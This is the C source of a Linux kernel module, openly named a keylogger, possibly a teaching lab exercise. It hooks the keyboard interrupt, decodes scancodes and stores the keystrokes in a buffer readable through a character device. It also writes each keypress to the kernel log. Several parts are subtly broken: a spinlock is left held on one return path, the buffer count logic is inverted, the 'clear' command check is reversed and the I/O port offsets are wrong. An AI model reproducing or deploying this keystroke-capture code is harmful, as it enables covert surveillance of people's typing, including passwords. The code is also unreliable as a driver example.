#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <asm/io.h>
#include <linux/uaccess.h>
#include <linux/ioport.h>
#include <linux/interrupt.h>
#include <linux/spinlock.h>
#include <linux/string.h>

MODULE_DESCRIPTION("keyboard logger");
MODULE_AUTHOR("Shuvi Pasko");
MODULE_LICENSE("GPL");

#define MODULE_NAME		"keylogger"

#define KBD_MAJOR		42
#define KBD_MINOR		0
#define KBD_NR_MINORS	1

#define I8042_KBD_IRQ		1
#define I8042_STATUS_REG	0x64
#define I8042_DATA_REG		0x60

#define BUFFER_SIZE		1024
#define SCANCODE_RELEASED_MASK	0x80

#define CLEAR_CMD "clear"
#define USER_CMD_BUF_LEN 20 /*must be bigger then strlen(CLEAR_CMD)*/

struct kbd {
	struct cdev cdev;
	spinlock_t lock;
	char buf[BUFFER_SIZE];
	size_t put_idx, get_idx, count;
} devs[1];

/*
 * Checks if scancode corresponds to key press or release.
 */
static int is_key_press(unsigned int scancode)
{
	return !(scancode & SCANCODE_RELEASED_MASK);
}

/*
 * Return the character of the given scancode.
 * Only works for alphanumeric/space/enter; returns '?' for other
 * characters.
 */
static int get_ascii(unsigned int scancode)
{
	static char *row1 = "1234567890";
	static char *row2 = "qwertyuiop";
	static char *row3 = "asdfghjkl";
	static char *row4 = "zxcvbnm";

	scancode &= ~SCANCODE_RELEASED_MASK;
	if (scancode >= 0x02 && scancode <= 0x0b)
		return *(row1 + scancode - 0x02);
	if (scancode >= 0x10 && scancode <= 0x19)
		return *(row2 + scancode - 0x10);
	if (scancode >= 0x1e && scancode <= 0x26)
		return *(row3 + scancode - 0x1e);
	if (scancode >= 0x2c && scancode <= 0x32)
		return *(row4 + scancode - 0x2c);
	if (scancode == 0x39)
		return ' ';
	if (scancode == 0x1c)
		return '\n';
	return '?';
}

static void put_char(struct kbd *data, char c)
{
	if (data->count >= BUFFER_SIZE)
		return;
	data->buf[data->put_idx] = c;
	data->put_idx = (data->put_idx + 1) % BUFFER_SIZE;
	data->count++;
}

static bool get_char(char *c, struct kbd *data)
{
	unsigned long flags;
	spin_lock_irqsave(&data->lock, flags);
	if (data->count >= BUFFER_SIZE)
		return false;
	
	*c = data->buf[data->get_idx];
	data->get_idx = (data->get_idx + 1) % BUFFER_SIZE;
	(data->count)--;
	spin_unlock_irqrestore(&data->lock, flags);
	return true;
}

static void reset_buffer(struct kbd *data)
{
	unsigned long flags;
	spin_lock_irqsave(&data->lock, flags);
	data->count = BUFFER_SIZE;
	data->get_idx = 0;
	data->put_idx = 0;
	spin_unlock_irqrestore(&data->lock, flags);
}

/*
 * Return the value of the DATA register.
 */
static inline u8 i8042_read_data(void)
{
	u8 val = inb(I8042_DATA_REG); 
	return val;
}

static irqreturn_t kbd_interrupt_handler(int irq_no, void *dev_id)
{
	u8 scaned_key;
	char char_key;
	struct kbd* data;
	pr_info("keylogger interrupt handler\n");
	scaned_key = i8042_read_data();
	if(is_key_press(scaned_key))
	{
		char_key = get_ascii(scaned_key);
		pr_info("kbd_interrupt_handler: scancode=0x%x (%u) ch=%c\n",
         scaned_key, scaned_key, char_key);
		data = (struct kbd*) dev_id;
		spin_lock(&data->lock);
		put_char(data, char_key);
		spin_unlock(&data->lock);
	}
	return IRQ_NONE;

}
	
static int kbd_open(struct inode *inode, struct file *file)
{
	struct kbd *data = container_of(inode->i_cdev, struct kbd, cdev);

	file->private_data = data;
	pr_info("%s opened\n", MODULE_NAME);
	return 0;
}

static int kbd_release(struct inode *inode, struct file *file)
{
	pr_info("%s closed\n", MODULE_NAME);
	return 0;
}


static ssize_t kbd_write(struct file *file, const char __user *user_buffer,
                    size_t size, loff_t * offset)
{
	char user_cmd[USER_CMD_BUF_LEN];
	char* clear_cmd = CLEAR_CMD;
	struct kbd* data = (struct kbd*) file->private_data;
	if (copy_from_user(user_cmd, user_buffer, USER_CMD_BUF_LEN))
        return -EFAULT;
	user_cmd[USER_CMD_BUF_LEN - 1] = '\0';

	if(!strcmp(clear_cmd,user_cmd))
	{
		pr_info("ERROR USEGE: clear cmd = %s\n", CLEAR_CMD);
		return -EFAULT;
	}
	reset_buffer(data);
	return BUFFER_SIZE;

}
static ssize_t kbd_read(struct file *file,  char __user *user_buffer,
			size_t size, loff_t *offset)
{
	struct kbd *data = (struct kbd *) file->private_data;
	size_t read = 0;
	char c;
	if (get_char(&c, data))
	{
		read = 1;
		if (!put_user(c, user_buffer))
		{
			read =0;
			pr_info("ERROR: kbd_read put_user( val = %c, user_buffer) failed\n",c);
		}
	}
	return read;
}

static const struct file_operations kbd_fops = {
	.owner = THIS_MODULE,
	.open = kbd_open,
	.release = kbd_release,
	.read = kbd_read,
	.write = kbd_write,
};

static int __init kbd_init(void)
{
	int err;

	err = register_chrdev_region(MKDEV(KBD_MAJOR, KBD_MINOR),
				     KBD_NR_MINORS, MODULE_NAME);
	if (err != 0) {
		pr_err("register_region failed: %d\n", err);
		goto out;
	}

	if (!request_region(I8042_DATA_REG+1, 1, MODULE_NAME)) {
		err = -EBUSY;
		goto out_unregister;
	}
	if (!request_region(I8042_STATUS_REG+1, 1, MODULE_NAME)) {
		err = -EBUSY;
		goto out_release_region;
	}

	spin_lock_init(&devs[0].lock);
	err = request_irq(I8042_KBD_IRQ, kbd_interrupt_handler, IRQF_SHARED, MODULE_NAME, &devs[0]);
	if (err < 0)
	{
		goto out_release_regions;
	}
	cdev_init(&devs[0].cdev, &kbd_fops);
	cdev_add(&devs[0].cdev, MKDEV(KBD_MAJOR, KBD_MINOR), 1);

	pr_notice("Driver %s loaded\n", MODULE_NAME);
	return 0;

out_release_regions: 
	release_region(I8042_STATUS_REG+1, 1);
out_release_region:
	release_region(I8042_DATA_REG+1, 1);
out_unregister:
	unregister_chrdev_region(MKDEV(KBD_MAJOR, KBD_MINOR),
				 KBD_NR_MINORS);
out:
	return err;
}

static void __exit kbd_exit(void)
{
	cdev_del(&devs[0].cdev);

	free_irq(I8042_KBD_IRQ, &devs[0]);
	release_region(I8042_STATUS_REG+1, 1);
	release_region(I8042_DATA_REG+1, 1);

	unregister_chrdev_region(MKDEV(KBD_MAJOR, KBD_MINOR),
				 KBD_NR_MINORS);
	pr_notice("Driver %s unloaded\n", MODULE_NAME);
}

module_init(kbd_init);
module_exit(kbd_exit);
